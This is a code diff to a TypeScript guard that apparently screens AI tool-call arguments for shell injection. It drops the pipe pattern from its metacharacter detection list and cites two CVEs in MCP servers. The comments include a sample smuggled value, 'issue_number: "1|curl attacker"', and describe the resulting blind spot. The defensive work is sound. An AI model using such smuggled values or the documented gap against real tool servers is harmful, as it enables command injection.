@@ -56,8 +56,14 @@ const PASS: InspectResult = { action: "pass", findings: [] };
  * `id`/`uuid`/`identifier`/`slug`/`namespace`/`number`/`num` are conventionally
  * single-token values with no legitimate reason to carry shell syntax; `path`
  * is included because a real filesystem path never legitimately contains
- * `;`/backtick/`&&`/an unescaped `|` on any OS, even though it may contain
- * spaces.
+ * `;`/backtick/`&&` on any OS, even though it may contain spaces — and it is
+ * required, since CVE-2026-25546's vulnerable parameter is `projectPath`.
+ *
+ * NOTE the bound on that reasoning, learned by measurement (TODOS #56): it
+ * holds for FILESYSTEM paths, but a `path`-suffixed ARGUMENT is also routinely
+ * a URL or API path, which legitimately carries a raw `|` in a query string.
+ * That is why the pipe pattern is gone; do not re-derive "a path can't contain
+ * X" from filesystem semantics alone when adding a pattern here.
  */
 const IDENTIFIER_KEY_SUFFIXES: ReadonlySet<string> = new Set([
   "id",
@@ -87,20 +93,32 @@ export function isIdentifierLikeArgKey(rawKey: string): boolean {
 // motivating CVEs don't even need (neither PoC uses `&`). Revisit with a
 // benign-corpus pass if evidence justifies it (review: TODOS #50).
 //
-// `||` needs no separate alternative: any string containing it already
-// contains a single `|`, which the bare-pipe pattern below already matches.
+// A bare pipe is DROPPED for the SAME three reasons as `&` above, each
+// measured pre-release rather than argued (TODOS #56):
+//   1. Gating it is evadable — `cmd1|cmd2` needs no whitespace either.
+//   2. Ungated, it false-positives on real values: a URL query string under a
+//      `path`-suffixed key routinely carries a raw pipe (`?family=Roboto|Open+Sans`
+//      — Google Fonts — plus `?fields=id|name`, `?sort=created|desc`), and this
+//      is a block-capable carrier, so all three were HARD-BLOCKED on the live relay.
+//   3. Neither motivating CVE needs it: CVE-2025-53818's PoC carries `;` and
+//      CVE-2026-25546's carries a backtick, so both still block. Deleting the
+//      pattern left all 150 guard tests green — it was never load-bearing, and
+//      nothing pinned it.
+// The cost is a real but narrower blind spot: a pipe-ONLY injection
+// (`issue_number: "1|curl attacker"`) with no other metacharacter now passes.
+// Restoring it needs a benign-corpus pass first — filed as TODOS #56, not
+// dropped silently.
 const SHELL_METACHAR_PATTERNS: readonly RegExp[] = [
   /\$\(/, // $(...) command substitution
   /`/, // backtick command substitution
   /;/, // statement separator
   /&&/, // command chaining (AND)
-  /\|/, // pipe — also covers `||` (a run of two pipes contains one)
 ];
 
 const REMEDIATION =
   "A tool call argument named like a bare identifier or filesystem path (an id, number, " +
   "path, slug, uuid, or namespace field) contains shell-metacharacter or " +
-  "command-substitution syntax ($(...), a backtick, ;, &&, or a pipe). " +
+  "command-substitution syntax ($(...), a backtick, ;, or &&). " +
   "Two real, disclosed CVEs (github-kanban-mcp-server CVE-2025-53818, godot-mcp " +
   "CVE-2026-25546) reach command injection through exactly this shape — the value is " +
   "spliced unescaped into a shell command. The call was blocked. If this tool " +
